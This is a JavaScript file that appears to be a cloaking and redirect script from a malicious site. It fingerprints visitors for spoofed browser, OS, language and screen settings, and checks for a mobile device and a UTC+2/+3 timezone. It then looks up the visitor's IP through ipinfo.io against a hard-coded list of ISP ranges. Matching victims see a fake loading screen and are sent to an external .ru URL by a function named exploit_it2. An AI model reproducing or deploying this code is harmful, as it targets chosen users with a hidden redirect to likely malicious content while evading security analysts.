let ranges=["46.56.0.1-46.56.127.254","46.216.0.1-46.216.255.254","87.252.242.1-87.252.243.254","93.125.123.1-93.125.123.254","93.125.124.1-93.125.124.254","134.17.0.1-134.17.255.254","176.60.0.1-176.60.255.254","178.168.128.1-178.168.255.254","185.20.112.1-185.20.115.254","217.21.61.1-217.21.61.254","128.140.240.1-128.140.255.254","128.65.0.1-128.65.63.254","178.163.128.1-178.163.255.254","37.17.0.1-37.17.127.254","46.56.128.1-46.56.255.254","77.74.32.1-77.74.35.254","77.74.36.1-77.74.39.254","185.183.120.1-185.183.123.254","5.100.192.1-5.100.199.254","5.100.200.1-5.100.207.254","5.100.208.1-5.100.215.254","5.100.216.1-5.100.223.254","46.191.0.1-46.191.31.254","46.191.32.1-46.191.63.254","46.191.64.1-46.191.95.254","46.191.96.1-46.191.127.254","77.67.128.1-77.67.143.254","77.67.144.1-77.67.159.254","77.67.160.1-77.67.175.254","77.67.176.1-77.67.191.254","77.67.192.1-77.67.207.254","77.67.208.1-77.67.223.254","77.67.224.1-77.67.239.254","77.67.240.1-77.67.255.254","81.30.80.1-81.30.80.254","81.30.81.1-81.30.81.254","81.30.82.1-81.30.82.254","81.30.83.1-81.30.83.254","81.30.84.1-81.30.84.254","81.30.85.1-81.30.85.254","81.30.86.1-81.30.86.254","81.30.87.1-81.30.87.254","81.30.88.1-81.30.88.254","81.30.89.1-81.30.89.254","81.30.90.1-81.30.90.254","81.30.91.1-81.30.91.254","81.30.92.1-81.30.92.254","81.30.93.1-81.30.93.254","81.30.94.1-81.30.94.254","81.30.95.1-81.30.95.254","109.126.128.1-109.126.159.254","109.126.160.1-109.126.167.254","109.126.168.1-109.126.175.254","109.126.176.1-109.126.183.254","109.126.184.1-109.126.191.254","164.177.192.1-164.177.223.254","164.177.224.1-164.177.255.254","178.154.0.1-178.154.127.254","185.6.24.1-185.6.27.254","178.176.73.147-178.176.73.147"];
var atoi = function atoi(addr) {
  var parts = addr.split(".").map(function(str) {
    return parseInt(str); 
  });
  return (parts[0] ? parts[0] << 24 : 0) +
         (parts[1] ? parts[1] << 16 : 0) +
         (parts[2] ? parts[2] << 8  : 0) +
          parts[3];
};
var checkIpaddrInRange = function checkIpaddrInRange(ipaddr, start, end) {
  var num = atoi(ipaddr);
  return (num >= atoi(start)) && (num <= atoi(end));
}
function dadadada(ip,range1,range2)
{
if(checkIpaddrInRange(ip,range1,range2)){return true;}else {return false;}
}
function checker0(){
myip2="3.1.2.5";
fetch("https://ipinfo.io/json?token=54a3acb2fb8fcf")
.then(function (response) {
return response.json();
})
.then(function (myJson) {
myip2=(myJson.ip);checker(myip2);
});
}
function checker(myip2)
{
let result=0;
for(i=0;i<ranges.length;i++)
{
rang=ranges[i];
rang=rang.split("-");
if(dadadada(myip2,rang[0],rang[1])){result=1;}
}
if(result==1){exploit_it2();}else goback();
}
var mobileDevice;
mobileDevice=false;
getHasLiedLanguages=function(){
  if(typeof navigator.languages !== "undefined"){
 try {
var firstLanguages = navigator.languages[0].substr(0, 2);
if(firstLanguages !== navigator.language.substr(0, 2)){
  return true;
}
 } catch(err) {
return true;
 }
  }
  return 0;
}
getHasLiedResolution=function(){
  if(screen.width < screen.availWidth){
 return true;
  }
  if(screen.height < screen.availHeight){
 return true;
  }
  return 0;
}

getHasLiedOs=function(){
  var userAgent = navigator.userAgent.toLowerCase();
  var oscpu = navigator.oscpu;
  var platform = navigator.platform.toLowerCase();
  var os;
  if(userAgent.indexOf("windows phone") >= 0){
 os = "Windows Phone";
  } else if(userAgent.indexOf("win") >= 0){
 os = "Windows";
  } else if(userAgent.indexOf("android") >= 0){
 os = "Android";
  } else if(userAgent.indexOf("linux") >= 0){
 os = "Linux";
  } else if(userAgent.indexOf("iphone") >= 0 || userAgent.indexOf("ipad") >= 0 ){
 os = "iOS";
  } else if(userAgent.indexOf("mac") >= 0){
 os = "Mac";
  } else{
 os = "Other";
  }
 
  if (("ontouchstart" in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0)) {
  mobileDevice = true;
  } else{
 mobileDevice = false;
  }
 if(mobileDevice && os !== "Windows Phone" && os !== "Android" && os !== "iOS" && os !== "Other"){
 return true;    
  }
  if(typeof oscpu !== "undefined"){
 oscpu = oscpu.toLowerCase();
 if(oscpu.indexOf("win") >= 0 && os !== "Windows" && os !== "Windows Phone"){
return true;
 } else if(oscpu.indexOf("linux") >= 0 && os !== "Linux" && os !== "Android"){
return true;
 } else if(oscpu.indexOf("mac") >= 0 && os !== "Mac" && os !== "iOS"){
return true;
 } else if(oscpu.indexOf("win") === 0 && oscpu.indexOf("linux") === 0 && oscpu.indexOf("mac") >= 0 && os !== "other"){
return true;
 }
  }
  if(platform.indexOf("win") >= 0 && os !== "Windows" && os !== "Windows Phone"){
 return true;
  } else if((platform.indexOf("linux") >= 0 || platform.indexOf("android") >= 0 || platform.indexOf("pike") >= 0) && os !== "Linux" && os !== "Android"){
 return true;
  } else if((platform.indexOf("mac") >= 0 || platform.indexOf("ipad") >= 0 || platform.indexOf("ipod") >= 0 || platform.indexOf("iphone") >= 0) && os !== "Mac" && os !== "iOS"){
 return true;
  } else if(platform.indexOf("win") === 0 && platform.indexOf("linux") === 0 && platform.indexOf("mac") >= 0 && os !== "other"){
 return true;
  }
 if(typeof navigator.plugins === "undefined" && os !== "Windows" && os !== "Windows Phone"){
 return true;
  }
 return 0;
}
getHasLiedBrowser=function () {
  var userAgent = navigator.userAgent.toLowerCase();
  var productSub = navigator.productSub;
  var browser;
  if(userAgent.indexOf("firefox") >= 0){
 browser = "Firefox";
  } else if(userAgent.indexOf("opera") >= 0 || userAgent.indexOf("opr") >= 0){
 browser = "Opera";
  } else if(userAgent.indexOf("chrome") >= 0){
 browser = "Chrome";
  } else if(userAgent.indexOf("safari") >= 0){
 browser = "Safari";
  } else if(userAgent.indexOf("trident") >= 0){
 browser = "Internet Explorer";
  } else{
 browser = "Other";
  }
 if((browser === "Chrome" || browser === "Safari" || browser === "Opera") && productSub !== "20030107"){
 return true;
  }
 var tempRes = eval.toString().length;
  if(tempRes === 37 && browser !== "Safari" && browser !== "Firefox" && browser !== "Other"){
 return true;
  } else if(tempRes === 39 && browser !== "Internet Explorer" && browser !== "Other"){
 return true;
  } else if(tempRes === 33 && browser !== "Chrome" && browser !== "Opera" && browser !== "Other"){
 return true;
  }
 //We create an error to see how it is handled
  var errFirefox;
  try {
 throw "a";
  } catch(err){
 try{
err.toSource();
errFirefox = true;
 } catch(errOfErr){
errFirefox = false;
 }
  }
  if(errFirefox && browser !== "Firefox" && browser !== "Other"){
 return true;
  }
  return 0;
}

var currentTimeZoneOffsetInHours = new Date().getTimezoneOffset() / 60;
timez="bad";
if(currentTimeZoneOffsetInHours=="-3" || currentTimeZoneOffsetInHours=="-2")
{
timez="good";
}
 mobileDevice = false;
   if (("ontouchstart" in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0)) {
  mobileDevice = true;
  } else{
 mobileDevice = false;
  }
 

if(getHasLiedLanguages()==0 && getHasLiedResolution()==0 && getHasLiedOs()==0 && getHasLiedBrowser()==0 && mobileDevice==true && timez=="good")
{
checker0();
}else goback();

function exploit_it2()
{
document.body.innerHTML = "<style>.expla{position:absolute;top:0;left:0;z-index:99999;width:100%;height:100%;background-color:black;}hz{color:white;font-size:50px;}</style><center><div class=expla><h1 class=hz>3arpy3ka</h1></div></center>";
document.location.href = "http://v93.retorr.ru/kjzgqvQr";
}


function goback()
{
return null;
}
